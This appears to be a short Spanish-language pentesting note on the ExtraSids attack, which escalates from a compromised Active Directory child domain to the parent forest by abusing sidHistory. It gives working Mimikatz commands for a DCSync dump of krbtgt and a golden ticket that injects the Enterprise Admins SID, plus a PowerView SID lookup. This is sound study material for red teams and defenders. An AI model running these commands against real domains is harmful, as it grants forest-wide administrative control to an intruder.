# ExtraSids Attack - Mimikatz

## Explicación rápida

- Este ataque permite comprometer a un dominio padre desde que el dominio hijo ya fue comprometido bajo el mismo **AD FOREST**.
- ![](https://s38063.pcdn.co/wp-content/uploads/2022/06/Active-Directory-forest-.jpg.optimal.jpg)
- Este ataque se basa en la explotación de propiedad sidHistory y la falta de protección de filtrado de SIDs (Sid filtering) entre dominios dentro de un AD FOREST.
- Para hacer este ataque se necesitan las siguientes condiciones:
    - HASH NT del KRBTGT del dominio hijo: Hay que generar un Golden Ticket.
    - SID del dominio fijo.
    - Nombre de un usuero objetivo en el dominio hijo.
    - FQDN del dominio hijo.
    - SID del grupo Enterprise Admins del dominio padre. 
- Debido a la ausencia de SID filtering, cuando este usuario autenticado con un SID modificado accede al dominio padre, est ratado como si fuera un miembro del grupo Admins, así dandole privilegios sobre todo el AD FOREST.

## Creación del golden ticket con mimikatz
- [Golden Ticket Attack más info](./goldenTicketAttack.md)
- `mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt`
- `kerberos::golden /user:hacker /domain:DOMAIN.LOCAL /sid:SID-FOR-THE-CHILD-DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:ENTERPRISE-ADMIN-SID /ptt`

## Obtener SID de enterprise admin
- `Get-DomainGroup -Domain DOMAIN.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`